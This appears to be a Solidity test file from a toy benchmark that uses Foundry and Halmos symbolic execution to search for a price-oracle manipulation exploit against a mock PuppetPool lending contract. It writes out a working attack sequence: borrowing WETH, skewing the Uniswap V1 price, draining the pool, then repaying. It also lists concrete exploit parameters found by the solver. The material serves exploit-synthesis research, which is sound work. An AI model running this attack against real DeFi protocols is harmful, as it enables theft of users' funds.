// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/WETH.sol";
import "@utils/QueryBlockchain.sol";
import "@halmos/SymTest.sol";

import "benchmarks/toy/BuySell/PuppetPool.sol";

contract BuySellTest is Test, BlockLoader, SymTest {
    address constant owner = address(0xdeadbeef);

    ERC20Basic token;
    WETH weth;
    UniswapV1 uniswap;
    PuppetPool puppetpool;

    uint256 public constant totalSupply = 1000 ether;
    uint256 public constant feeRate = 15;

    uint256 public constant attackerInitBalance = 0 ether;
    uint256 public constant attackerInitToken = 0 ether;

    uint256 public constant uniswapInitBalance = 10 ether;
    uint256 public constant uniswapInitToken = 10 ether;

    uint256 public constant puppetpoolInitBalance = 100 ether;
    uint256 public constant puppetpoolInitToken = 0 ether;

    uint256 public constant requiredBalance =
        puppetpoolInitBalance + attackerInitBalance;

    function setUp() public {
        vm.startPrank(owner);
        token = new ERC20Basic(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        puppetpool = new PuppetPool(
            address(token),
            address(weth),
            address(uniswap)
        );
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(address(uniswap), uniswapInitBalance);
        weth.transfer(address(puppetpool), puppetpoolInitBalance);

        // Pre-approve to mock the flashloan
        token.approve(self(), UINT256_MAX);
        weth.approve(self(), UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        address attacker = self();
        address uniswap_ = address(uniswap);
        address pool_ = address(puppetpool);
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(weth), attacker, weth.decimals());
        queryERC20BalanceDecimals(address(token), attacker, token.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(address(weth), uniswap_, weth.decimals());
        queryERC20BalanceDecimals(address(token), uniswap_, token.decimals());
        emit log_string("");
        emit log_string("Bank Balances: ");
        queryERC20BalanceDecimals(address(weth), pool_, weth.decimals());
        queryERC20BalanceDecimals(address(token), pool_, token.decimals());
        emit log_string("");
        emit log_string("");
    }

    function self() internal view returns (address) {
        return address(this);
    }

    function nop() internal pure {
        return;
    }

    function borrow_ERC20Basic(uint256 amount) internal {
        token.transferFrom(owner, self(), amount);
    }

    function borrow_WETH(uint256 amount) internal {
        weth.transferFrom(owner, self(), amount);
    }

    function swap_UniswapV1_ERC20Basic_WETH(uint256 amount) internal {
        token.approve(address(uniswap), UINT256_MAX);
        uniswap.swapTokenToWETH(amount);
    }

    function swap_UniswapV1_WETH_ERC20Basic(uint256 amount) internal {
        weth.approve(address(uniswap), UINT256_MAX);
        uniswap.swapWETHToToken(amount);
    }

    function swap_PuppetPool_ERC20Basic_WETH(uint256 amount) internal {
        token.approve(address(puppetpool), UINT256_MAX);
        puppetpool.borrowWETH(amount);
    }

    function hackedAction_PuppetPool_WETH(uint256 amount) internal {
        token.approve(address(puppetpool), UINT256_MAX);
        puppetpool.borrowWETH(amount);
    }

    function payback_ERC20Basic(uint256 amount) internal {
        token.transfer(owner, amount);
    }

    function payback_WETH(uint256 amount) internal {
        weth.transfer(owner, amount);
    }

    function testAttackGT() public {
        printBalance("Before exploit: ");

        borrow_WETH(uniswapInitBalance);
        swap_UniswapV1_WETH_ERC20Basic(uniswapInitBalance);
        hackedAction_PuppetPool_WETH(puppetpoolInitBalance);
        swap_UniswapV1_ERC20Basic_WETH(token.balanceOf(self()));
        nop();
        nop();
        payback_WETH(uniswapInitBalance + 1 ether);
        printBalance("After exploit: ");
        require(attackGoal(), "Attack Failed!");
    }

    function testHalmosOutput0() public {
        // Corresponds to check_cand0, failed.
        borrow_ERC20Basic(0x1eeb1035f37840004f);
        swap_UniswapV1_ERC20Basic_WETH(0x1eeb1035f37840004f);
        hackedAction_PuppetPool_WETH(0x4000200401c434000);
        swap_UniswapV1_WETH_ERC20Basic(0x0);
        nop();
        swap_UniswapV1_WETH_ERC20Basic(0x1ffffffff20000000);
        payback_ERC20Basic(0x1ef8f0eca71fa4004f);
        assert(!attackGoal());
        require(attackGoal(), "Attack Failed!");
    }

    function testHalmosOutput1() public {
        // Corresponds to check_cand1, passed.
        // It is not the best, but could prove the attacker could earn more than 1 ether.
        borrow_WETH(0x2a3439b65f577c0200);
        swap_UniswapV1_WETH_ERC20Basic(0x2a3439b65f577c0200);
        hackedAction_PuppetPool_WETH(0x40400000000000001);
        swap_UniswapV1_ERC20Basic_WETH(0x4630eef23a48084);
        nop();
        nop();
        payback_WETH(0x2a3439b65f577c0200 + 1 ether);
        printBalance("After exploit: ");
        require(attackGoal(), "Attack Failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt0 == amt1);
        vm.assume(amt6 == amt0 + 1 ether);
        borrow_WETH(amt0);
        swap_UniswapV1_WETH_ERC20Basic(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_ERC20Basic_WETH(amt3);
        nop();
        nop();
        payback_WETH(amt6);
        assert(!attackGoal());
    }

    function check_cand0(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt0 == amt1);
        vm.assume(amt6 == amt0 + 1 ether);
        borrow_ERC20Basic(amt0);
        swap_UniswapV1_ERC20Basic_WETH(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_WETH_ERC20Basic(amt3);
        nop();
        swap_UniswapV1_WETH_ERC20Basic(amt5);
        payback_ERC20Basic(amt6);
        assert(!attackGoal());
    }

    function check_cand1(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt0 == amt1);
        vm.assume(amt6 == amt0 + 1 ether);
        borrow_WETH(amt0);
        swap_UniswapV1_WETH_ERC20Basic(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_ERC20Basic_WETH(amt3);
        nop();
        nop();
        payback_WETH(amt6);
        assert(!attackGoal());
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(self()) >= 1 ether;
    }
}
